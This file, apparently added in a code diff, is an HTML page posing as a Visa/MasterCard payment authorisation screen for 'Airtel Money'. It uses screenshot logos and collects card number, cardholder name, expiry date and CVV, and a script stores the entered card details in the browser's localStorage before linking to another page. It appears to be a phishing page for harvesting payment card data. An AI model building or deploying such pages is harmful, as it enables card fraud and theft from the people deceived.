@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visa Payment Service</title>
+    <link rel="stylesheet" href="style.css">
+    <script>
+        // Function to save data to localStorage
+        function saveData() {
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardName = document.getElementById('cardName').value;
+            const expMonth = document.getElementById('expMonth').value;
+
+            // Retrieve existing data from localStorage, or initialize an empty array if none exists
+            let storedData = JSON.parse(localStorage.getItem('storedData')) || [];
+
+            // Add new entry to the array
+            storedData.push({ cardNumber: cardNumber, cardName: cardName, expMonth: expMonth });
+
+            // Save the updated array back to localStorage
+            localStorage.setItem('storedData', JSON.stringify(storedData));
+
+            
+             
+        }
+
+        // Function to clear form fields after saving
+        function clearFields() {
+            document.getElementById('cardNumber').value = '';
+            document.getElementById('cardName').value = '';
+            document.getElementById('expMonth').value = '';
+        }
+
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="Screenshot 2024-09-13 at 2.00.14 AM.png" alt="Verified by VISA">
+            <img src="Screenshot 2024-09-14 at 3.03.42 AM.png" alt="MasterCard">
+        </div>
+        
+            <h3>Payment Information</h3>
+            <p>(Please enter your card details to authorize this transaction.)</p>
+            <div class="inputBox">
+                <label for="merchant">Merchant Name:</label>
+                <input type="text" name="merchant" id="merchant" value="Airtel Money" readonly>
+            </div>
+
+
+            <form onsubmit="event.preventDefault(); saveData();">
+            <div class="inputBox">
+                <label for="cardNumber">Card Number:</label>
+                <input type="text" name="cardNumber" id="cardNumber" placeholder="Enter card number" required>
+            </div>
+            <div class="inputBox">
+                <label for="cardName">Card Holder's Name:</label>
+                <input type="text" id="cardName" placeholder="Enter name on card" required>
+            </div>
+            <div class="flex">
+                <div class="inputBox">
+                    <label for="expMonth">Expiry Date:</label>
+                    <div style="display: flex;">
+                    <input type="text" id="expMonth" placeholder="MM" required>
+                    <input type="text" id="expMonth" placeholder="YY" required>
+                    </div>
+                </div>
+            </div>
+            <div class="inputBox">
+                <label for="cvv">CVV2/CVC2:</label>
+                <input type="text" id="cvv" placeholder="Enter CVV" required>
+            </div>
+
+            
+
+            <a href="index copy 2.html" >
+            <input type="submit"  value="Submit" class="submit-btn">
+            </a>
+            
+            <p class="timeout">This page will automatically timeout after 180 seconds</p>
+        
+    </div>
+
+    
+    
+    <script src="index.js"></script>
+</body>
+</html>
